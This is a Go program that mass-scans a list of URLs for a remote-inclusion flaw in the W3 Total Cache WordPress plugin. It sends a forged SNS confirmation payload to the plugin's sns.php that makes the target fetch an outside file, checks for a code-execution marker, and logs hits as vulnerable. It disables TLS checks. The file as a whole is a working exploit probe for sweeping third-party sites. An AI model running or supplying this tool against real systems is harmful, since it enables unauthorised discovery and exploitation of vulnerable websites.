package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)



func main() {
	flag.Parse()

	var input io.Reader
	input = os.Stdin

	if flag.NArg() > 0 {
		file, err := os.Open(flag.Arg(0))
		if err != nil {
			fmt.Printf("failed to open file: %s\n", err)
			os.Exit(1)
		}
		input = file
	}

	sc := bufio.NewScanner(input)

	urls := make(chan string, 128)
	concurrency := 12
	var wg sync.WaitGroup
	wg.Add(concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			for raw := range urls {

				u, err := url.ParseRequestURI(raw)
				if err != nil {
					fmt.Printf("invalid url: %s\n", raw)
					continue
				}

				if !resolves(u) {
					fmt.Printf("does not resolve: %s\n", u)
					continue
				}

				resp, err := fetchURL(u)
				if err != nil {
					fmt.Printf("failed to fetch: %s (%s)\n", u, err)
					continue
				}


				if resp.StatusCode != http.StatusOK {
					fmt.Printf("non-200 response code: %s (%s)\n", u, resp.Status)
				}
				if resp.StatusCode == http.StatusOK {
					fmt.Printf("200 response code: %s (%s)\n", u, resp.Status)
					buf := new(bytes.Buffer)
					buf.ReadFrom(resp.Body)
					newStr := buf.String()
					if strings.Contains(newStr , "TmVzc3VzQ29kZUV4ZWNUZXN0") == true {
						color.HiGreen("[*] Vulnerable System Found!\n")
						f, err := os.OpenFile("text.log",
							os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
						if err != nil {
							log.Println(err)
						}
						defer f.Close()
						if _, err := f.WriteString(""+u.String()+"/\n"); err != nil {
							log.Println(err)
						}


					}
				}
			}
			wg.Done()
		}()
	}

	for sc.Scan() {
		urls <- sc.Text()
	}
	close(urls)

	if sc.Err() != nil {
		fmt.Printf("error: %s\n", sc.Err())
	}

	wg.Wait()
}

func resolves(u *url.URL) bool {
	addrs, _ := net.LookupHost(u.Hostname())
	return len(addrs) != 0
}

func fetchURL(u *url.URL) (*http.Response, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}
	payload := `{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"http://rfi.nessus.org/rfi.txt"}`
	payloads := strings.NewReader(payload)
	req, err := http.NewRequest("PUT", ""+u.String()+"/wp-content/plugins/w3-total-cache/pub/sns.php", payloads)
if err != nil {
return nil, err
}

req.Close = true
req.Header.Set("User-Agent", "wp-cache scanner/0.1")
resp, err := client.Do(req)





if err != nil {
return nil, err
}

return resp, err
}
